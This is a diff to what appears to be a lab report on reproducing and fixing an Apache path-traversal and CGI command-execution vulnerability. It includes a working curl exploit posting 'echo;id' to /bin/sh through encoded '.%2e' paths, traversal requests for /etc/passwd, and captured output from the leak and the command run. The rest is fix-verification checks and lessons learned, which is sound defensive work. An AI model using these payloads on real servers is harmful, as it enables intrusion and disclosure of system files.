@@ -364,12 +364,21 @@ curl --path-as-is --data 'echo;id' \
   'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
 ```
 
-Expected on the vulnerable build:
+**Measured** on the vulnerable build (2026-10-19, inside the container; full
+transcript in `cve/evidence/vulnerable.txt`):
 
 ```
+2. Path traversal: GET /icons/.%2e/../../../../etc/passwd
+HTTP 200
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+>>> VULNERABLE: /etc/passwd was disclosed.
+
+3. RCE: POST /cgi-bin/.%2e/../../../../bin/sh
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
+>>> VULNERABLE: command execution confirmed.
 ```
 
 > `--path-as-is` matters: without it curl collapses `/icons/.%2e/../` on the
@@ -460,7 +469,7 @@ encoding, `%2f`, `/.%2e/`) and performs a regression check:
 
 ```
 [PASS] home page still returns 200                     <- functionality intact
-[PASS] traversal answered with 404/403
+[PASS] traversal rejected with 400/403/404
 [PASS] no /etc/passwd content in the body
 [PASS] no uid= in the response
 [PASS] no leak for /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hostname
@@ -470,12 +479,19 @@ encoding, `%2f`, `/.%2e/`) and performs a regression check:
 RESULT: fix verified -- all checks passed.
 ```
 
+The status codes are worth recording: 2.4.51 answers **400 Bad Request** for the
+paths it can reject during normalisation (`/icons/.%2e/...`, `/cgi-bin/.%2e/...`,
+`/.%2e/...`); only the encoded-slash variant
+(`/icons/..%2f..%2f..%2f..%2fetc%2fpasswd`) falls through to 404. Both are a
+refusal, but the report quotes what was actually observed — which is why the
+assertion accepts 400/403/404 rather than insisting on 404.
+
 Fixing only the exact string from the advisory would be a blacklist fix, and
 2.4.50 is the cautionary tale. Hence the variants.
 
 > ⬜ **Pending screenshot**: `docs/screenshots/cve-fixed.png`
 
-![Fix verified: same request returns 404, verify-fix all PASS](screenshots/cve-fixed.png)
+![Fix verified: same request returns 400, verify-fix all PASS](screenshots/cve-fixed.png)
 
 ### 4.6 Defence in depth
 
@@ -509,7 +525,7 @@ patches land in time.
 2. Security tests must be regressions: 24 of the 84 cases exist to attack the
    application, so breaking a control turns CI red immediately.
 3. A CVE reproduction is valuable because it builds a **causal chain**: one
-   `%2e`, one ordering bug, one `404` versus one `root:x:0:0`. Only with that
+   `%2e`, one ordering bug, one `400` versus one `root:x:0:0`. Only with that
    chain can you write a patch and a detection rule.
 4. A fix must be verified with **the same configuration and only the version
    changed**, plus a regression test — otherwise you cannot tell "fixed" from
